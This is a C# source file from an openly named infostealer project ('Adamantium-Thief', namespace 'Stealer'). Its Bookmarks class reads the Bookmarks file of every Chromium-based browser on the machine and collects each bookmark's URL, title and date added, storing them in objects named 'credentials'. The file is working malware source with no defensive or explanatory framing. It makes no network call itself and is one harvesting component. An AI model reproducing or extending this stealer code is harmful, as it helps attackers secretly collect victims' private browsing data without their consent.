/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/Adamantium-Thief
*/

using System;
using System.IO;
using System.Collections.Generic;
using static Stealer.Common;

namespace Stealer
{
    class Bookmarks
    {
        public static List<Bookmark> Get()
        {
            string JsonFile = "Bookmarks";
            List<Bookmark> Bookmarks = new List<Bookmark>();

            // Search all browsers
            foreach (string browser in Paths.chromiumBasedBrowsers)
            {
                string Browser = Paths.GetUserData(browser) + JsonFile;
                if (!File.Exists(Browser)) { 
                    continue;
                }

                string bookmarksFile = File.ReadAllText(Browser);
                foreach (SimpleJSON.JSONNode mark in SimpleJSON.JSON.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
                {
                    Bookmark credentials = new Bookmark();
                    credentials.hostname = mark["url"];
                    credentials.title = mark["name"];
                    credentials.added = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64((string)mark["date_added"])), TimeZoneInfo.Local));
                    
                    Bookmarks.Add(credentials);
                }
         
                continue;
            }
            return Bookmarks;
        }
    }
}
